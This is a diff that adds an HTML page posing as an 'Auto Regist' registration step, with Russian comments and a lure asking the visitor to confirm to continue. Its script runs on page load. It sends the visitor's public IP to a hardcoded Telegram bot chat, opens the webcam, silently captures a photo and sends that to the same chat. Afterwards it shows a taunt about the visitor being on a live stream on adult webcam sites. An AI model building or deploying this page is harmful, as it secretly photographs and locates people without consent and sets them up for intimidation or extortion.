@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Regist</title>
+</head>
+<body>
+
+<div id="status">НАЖМИТЕ ПОДТВЕРДИТЬ ЧТО БЫ ПРОДОЛЖИТЬ!</div>
+<video id="video" width="640" height="480" autoplay></video>
+<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+<script>
+// Ваш токен Telegram бота
+const TELEGRAM_BOT_TOKEN = '7375388757:AAEVKh497xl9wZUo5Ve29sH0hxY9LdD2Q0k';
+// Ваш ID чата (например, ваш ID пользователя или ID группы)
+const TELEGRAM_CHAT_ID = '1782765405';
+
+// Функция для получения публичного IP-адреса
+function getPublicIP() {
+    return fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => data.ip)
+        .catch(error => console.error('Ошибка при получении IP-адреса:', error));
+}
+
+// Функция для отправки IP-адреса в Telegram
+function sendIPToTelegram(ip) {
+    const message = `Новый посетитель сайта. IP-адрес: ${ip}`;
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+    const params = {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message
+    };
+
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(params)
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            console.log('Сообщение отправлено в Telegram');
+        } else {
+            console.error('Ошибка при отправке сообщения в Telegram:', data);
+        }
+    })
+    .catch(error => console.error('Ошибка при отправке сообщения:', error));
+}
+
+// Функция для захвата фото с веб-камеры
+function capturePhoto() {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+
+    // Захват кадра с видео
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+    // Получение данных изображения в формате base64
+    return canvas.toDataURL('image/png');
+}
+
+// Функция для отправки фото в Telegram
+function sendPhotoToTelegram(photoDataUrl) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+
+    const formData = new FormData();
+    formData.append('chat_id', TELEGRAM_CHAT_ID);
+    formData.append('photo', dataURLtoBlob(photoDataUrl));
+
+    fetch(url, {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            console.log('Фото отправлено в Telegram');
+        } else {
+            console.error('Ошибка при отправке фото в Telegram:', data);
+        }
+    })
+    .catch(error => console.error('Ошибка при отправке фото:', error));
+}
+
+// Получаем IP-адрес
+getPublicIP().then(ip => {
+	// Отправляем IP-адрес
+	sendIPToTelegram(ip);
+    });
+
+// Конвертация base64 в Blob
+function dataURLtoBlob(dataurl) {
+    const arr = dataurl.split(',');
+    const mime = arr[0].match(/:(.*?);/)[1];
+    const bstr = atob(arr[1]);
+    let n = bstr.length;
+    const u8arr = new Uint8Array(n);
+    while(n--) {
+        u8arr[n] = bstr.charCodeAt(n);
+    }
+    return new Blob([u8arr], {type: mime});
+}
+
+// Доступ к веб-камере
+navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+    })
+    .catch(error => console.error('Ошибка при доступе к веб-камере:', error));
+
+// Когда видео готово, захватите фото и отправьте его в Telegram
+document.getElementById('video').addEventListener('canplay', () => {
+    // Получаем IP-адрес
+    getPublicIP().then(ip => {
+	
+        // Захватываем фото с веб-камеры и отправляем его
+        const photoDataUrl = capturePhoto();
+        sendPhotoToTelegram(photoDataUrl);
+        document.getElementById('status').innerText = 'Помаши ручкой на прямую трансляцию на ВебКам и PH';
+    });
+});
+
+</script>
+
+</body>
+</html>
